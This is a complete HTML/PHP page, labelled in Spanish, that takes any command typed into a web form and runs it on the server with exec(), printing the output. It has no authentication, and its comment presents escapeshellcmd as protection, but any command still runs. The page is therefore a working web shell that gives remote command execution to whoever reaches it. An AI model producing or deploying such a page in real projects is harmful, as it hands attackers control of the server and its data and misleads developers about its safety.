<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ejecutar Comando</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="input-container">                    
    <form method="POST">
        <input type="text" name="command" placeholder="Escribe un comando...">
        <button type="submit">Ejecutar</button>
    </form>
</div>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['command'])) {
    $command = escapeshellcmd($_POST['command']); // Escapa caracteres peligrosos
    $output = [];
    $status = 0;
    
    // Ejecutar el comando y capturar la salida
    exec($command, $output);

    // Mostrar el resultado
    print "<h3>Resultado:</h3>";
    print "<div class='output'>" . htmlspecialchars(implode("\n", $output)) . "</div>";
}
?>

</body>
</html>